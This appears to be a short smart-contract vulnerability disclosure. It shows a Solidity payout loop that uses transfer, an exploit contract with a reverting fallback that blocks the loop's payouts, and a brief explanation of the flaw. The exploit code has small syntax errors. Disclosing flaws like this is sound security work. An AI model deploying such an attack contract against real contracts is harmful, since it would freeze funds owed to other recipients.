## Vulnerable Code

```javascript
 function distributeFunds() public {
        uint balance = address(this).balance;
        require(balance >= 10**(sharesExponent.add(2)), "You can not split up less wei than sum of all shares");
        for (uint i = 0; i < distributions.length; i++) {
            Distribution memory distribution = distributions[i];
            uint amount = calculatePayout(balance, distribution.mantissa, sharesExponent);
            distribution.destination.transfer(amount);   //Vulnerable position 
            emit FundsOperation(distribution.destination, amount, FundsOperationType.Outgoing);
        }
    }
```



## Exploit Code

```javascript
contract Attack{
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }

    function startAttack(){
        victimAddress.call(byte4(keccak256(“distributeFunds()”)));
    }

    function(){
        revert();
    }
}
```



##  Sophisticated Vulnerability Description
Now let's look at the position of "//Vulnerable position", as we all know 'transfer' can revert transaction if failed.so if one of 'distributions' element is failed then other address will be affect. ps:"...." represent an appropriate parameter
